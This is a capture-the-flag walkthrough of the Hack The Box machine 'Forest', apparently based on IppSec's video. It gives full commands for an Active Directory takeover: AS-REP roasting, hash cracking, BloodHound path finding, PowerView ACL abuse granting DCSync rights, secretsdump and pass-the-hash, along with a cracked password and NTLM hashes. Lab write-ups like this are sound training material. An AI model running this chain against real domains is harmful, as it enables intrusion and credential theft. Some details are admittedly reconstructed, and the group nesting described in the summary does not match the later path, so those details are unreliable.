# Forest

| Attribute | Value |
|---|---|
| OS | Windows Server 2016 (Domain Controller) |
| Difficulty | Easy |
| IP | 10.10.10.161 |
| IppSec video | <https://www.youtube.com/watch?v=H9FcE_FMZio> |

## Source
- `[per transcript]` — chain, tools, and reasoning are taken from IppSec's
  walkthrough video; specific keystrokes are paraphrased.
- `[reconstructed]` — domain values (DC name `FOREST`, hashes, account
  names) are widely published; reconstructed from training data where the
  transcript is summary-level.

## TL;DR Attack Chain
Anonymous LDAP / RPC null session enumerates the user list including the
service account `svc-alfresco`. That account has Kerberos pre-auth
disabled, so AS-REPRoasting yields a hash → `s3rvice` cracked with
hashcat. WinRM in as `svc-alfresco`, run BloodHound, see that
`Exchange Trusted Subsystem` (group → which `svc-alfresco` is in via
`Account Operators` → `Service Accounts` → group nesting) has `WriteDACL`
on the domain object. Add an attacker-controlled user to the right group,
grant DCSync rights, dump krbtgt → pass-the-hash as administrator.

## Initial Enumeration

```bash
sudo nmap -p- --min-rate=10000 -T4 -oA nmap/all-tcp 10.10.10.161
sudo nmap -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 -oA nmap/detail 10.10.10.161
```

Key observations:
- Port cluster `88, 389, 445, 636, 3268, 3269` ⇒ this is a Domain
  Controller.
- Realm from nmap LDAP probe: `htb.local`. Domain: `htb.local`. NetBIOS:
  `HTB`.
- Hostname from cert: `FOREST.htb.local`.
- WinRM (5985) is open — gold for follow-on access if creds materialise.

`/etc/hosts`:
```
10.10.10.161  forest.htb.local  htb.local  FOREST
```

## Attack Surface Mapping

| Service | Port | Hypothesis |
|---|---|---|
| DNS | 53 | Realm DNS; possibly zone transfer (unlikely, but cheap to try) |
| Kerberos | 88 | Username brute (Kerbrute) if other channels dry up |
| RPC EPMAP | 135 | Null session / DCERPC enumeration |
| LDAP / GC | 389/3268 | Anonymous bind for users; primary recon target |
| SMB | 445 | Null session, share listing |
| WinRM | 5985 | Post-auth shell channel |

## Foothold

### 1. Anonymous SMB / RPC enumeration

```bash
smbclient -L //10.10.10.161/ -N
# usually returns "no shares" or NT_STATUS_ACCESS_DENIED here
# but rpcclient null still works:

rpcclient -U "" -N 10.10.10.161
> srvinfo
> enumdomusers
```

`enumdomusers` returns the full user list, including:
- `Administrator`, `Guest`, `krbtgt`
- `DefaultAccount`, `$331000-VK4ADACQNUCA`
- `SM_*` (Exchange-managed system mailboxes)
- `HealthMailbox*` (Exchange health checks)
- `sebastian`, `lucinda`, `svc-alfresco`, `andy`, `mark`, `santi`

> **Why this matters**: 27+ accounts with no auth required. The IppSec
> reasoning is "the box is built around the user list, so the moment we
> have it we should look for low-hanging accounts (service accounts)
> first."

### 2. Save and clean the userlist

```bash
rpcclient -U "" -N 10.10.10.161 -c "enumdomusers" \
  | grep -oP 'user:\[\K[^\]]+' > users.txt

# also via impacket
impacket-lookupsid 'htb.local/'@10.10.10.161 \
  | grep SidTypeUser | awk -F'\\\\' '{print $2}' | awk '{print $1}' >> users.txt
sort -u users.txt -o users.txt
```

### 3. AS-REPRoasting

The interesting account `svc-alfresco` has `DONT_REQUIRE_PREAUTH` set — a
common config for service accounts that integrate with non-Kerberos
products like Alfresco.

```bash
impacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161 -no-pass \
  -usersfile users.txt -format hashcat -outputfile asrep.hashes
```

Output contains a hash for `svc-alfresco`:
```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:...:...
```

Crack:
```bash
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
# password: s3rvice
```

### 4. WinRM as svc-alfresco

```bash
evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice'
```

Read `user.txt` from the desktop.

## Privilege Escalation

### 5. BloodHound collection from the foothold

```bash
# from attacker
bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -ns 10.10.10.161 -c All -o bh
neo4j start
bloodhound

# import the .json files; right-click svc-alfresco → "Mark as Owned"
# Pre-built query: "Find Shortest Paths to Domain Admins"
```

The path that BloodHound returns:

```
svc-alfresco
  → MemberOf → SERVICE ACCOUNTS@HTB.LOCAL
  → MemberOf → PRIVILEGED IT ACCOUNTS@HTB.LOCAL
  → MemberOf → ACCOUNT OPERATORS@HTB.LOCAL
  → GenericAll → EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL
  → WriteDacl → HTB.LOCAL (the domain object)
  ⇒ DCSync rights
```

> **IppSec reasoning**: "If you have WriteDACL on the domain itself, you
> can add yourself to the ACL with DS-Replication-Get-Changes-All, which
> is exactly what DCSync needs. We don't need to be a Domain Admin; we
> need replication rights."

### 6. Add ourselves to Exchange Windows Permissions, then to ACL

There are two ways to abuse this in IppSec's video; he shows the
PowerView path:

```powershell
# upload PowerView, PowerShell session as svc-alfresco
upload PowerView.ps1
. .\PowerView.ps1

# add svc-alfresco (or a new user) to Exchange Windows Permissions
$pass = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\svc-alfresco', $pass)

# Add to group via existing Account Operators rights
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members 'svc-alfresco' -Credential $cred

# Now grant DCSync to svc-alfresco
Add-DomainObjectAcl -TargetIdentity 'DC=htb,DC=local' \
  -PrincipalIdentity svc-alfresco \
  -Rights DCSync -Credential $cred
```

### 7. DCSync → Administrator hash

```bash
impacket-secretsdump htb.local/svc-alfresco:'s3rvice'@10.10.10.161 -just-dc
```

This returns NTLM hashes for every user including:
- `Administrator:500:aad3...:32693b11e6aa90eb43d32c72a07ceea6:::`
- `krbtgt:502:aad3...:819af826bb148e603acb0f33d17632f8:::`

### 8. Pass-the-hash as Administrator

```bash
evil-winrm -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

Read `C:\Users\Administrator\Desktop\root.txt`.

## Key Findings

- `svc-alfresco` shipped with `DONT_REQUIRE_PREAUTH` — likely a real-world
  pattern for legacy app integrations.
- Group nesting (Account Operators → Exchange Windows Permissions →
  WriteDACL on domain) is invisible from `whoami /groups` output —
  BloodHound was essential to spot it.
- The domain has *Exchange installed* (visible from `SM_*` accounts)
  even though Exchange is not exposed externally; Exchange's group
  permissions are the bridge to DCSync.

## Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Service discovery |
| `rpcclient` | Anonymous user enumeration |
| `impacket-lookupsid` | Cross-check user SIDs |
| `impacket-GetNPUsers` | AS-REPRoasting |
| `hashcat` | Crack AS-REP hash |
| `evil-winrm` | Initial shell |
| `bloodhound-python` | Off-host BloodHound collection |
| `BloodHound` (GUI) | Visualise privesc graph |
| `PowerView` | Modify group membership / add ACL |
| `impacket-secretsdump` | DCSync |

## Decision Tree

```
nmap → AD detected (88 + 389 + 445 + 5985)
  └─ rpcclient -U "" -N → ✅ enumdomusers
       └─ users.txt → AS-REPRoast everyone
            └─ svc-alfresco hash → crack → 's3rvice'
                 └─ evil-winrm svc-alfresco
                      └─ BloodHound from inside (or off-host w/ bloodhound-python)
                           └─ "Shortest Path to DA" → WriteDACL chain
                                └─ Add Self to Exchange Windows Permissions
                                     └─ Add DCSync rights to self
                                          └─ secretsdump → Administrator NTLM
                                               └─ evil-winrm -H → root.txt
```

## Alternative Approaches

- **LDAP anonymous bind** instead of RPC null session for the userlist —
  works equivalently. `ldapsearch -x -b "DC=htb,DC=local"
  "(objectClass=user)" sAMAccountName`.
- **AS-REPRoast all users** rather than filtering for the
  `DONT_REQUIRE_PREAUTH` flag first; the impacket script silently skips
  the pre-auth-required users, so spraying the entire userlist is
  acceptable.
- **`aclpwn`** automates the WriteDACL → DCSync chain end-to-end.
- **`addspn` + targeted Kerberoast** is *not* the path here, but is the
  alternative when AS-REP isn't available.
- IppSec also shows a PowerShell path (`Add-DomainObjectAcl`) and a
  Linux-side `impacket-dacledit` path; both work.

## Lessons Learned

1. The user list is the foothold. Once you have 27 accounts, AS-REPRoast
   the whole list — cheap, statistically rich.
2. Exchange-related groups carry surprising permissions; if `Exchange
   Windows Permissions` exists in any AD environment, it's worth a
   BloodHound query.
3. `WriteDACL on domain` ⇒ DCSync is a one-step jump; recognising it in
   BloodHound is more valuable than memorising any exploit.
4. Service accounts often retain legacy Kerberos flags long after the
   integration is decommissioned. AS-REPRoast them all.

## Extracted Skills

- [`active-directory/anonymous-ad-enumeration.md`](../active-directory/anonymous-ad-enumeration.md)
- [`active-directory/as-rep-roasting.md`](../active-directory/as-rep-roasting.md)
- [`active-directory/bloodhound-usage.md`](../active-directory/bloodhound-usage.md)
- [`active-directory/dcsync.md`](../active-directory/dcsync.md)
- [`active-directory/writedacl-abuse.md`](../active-directory/writedacl-abuse.md)
- [`tool-usage/evil-winrm.md`](../tool-usage/evil-winrm.md)
- [`tool-usage/impacket.md`](../tool-usage/impacket.md)
- [`tool-usage/hashcat.md`](../tool-usage/hashcat.md)
- [`password-attacks/hash-cracking.md`](../password-attacks/hash-cracking.md)

## Related Techniques (other machines)

- **Sauna** — same AS-REP→DCSync template, but with username generation.
- **Mantis** — older Exchange/AD chain.
- **Resolute** — DnsAdmins group abuse, related ACL pathway.
- **Multimaster** — second-stage ACL abuse after SQLi/foothold.
- **Outdated** — Exchange-driven privesc with PrintNightmare.
- **Authority** — modern AD with Ansible Vault + ADCS.
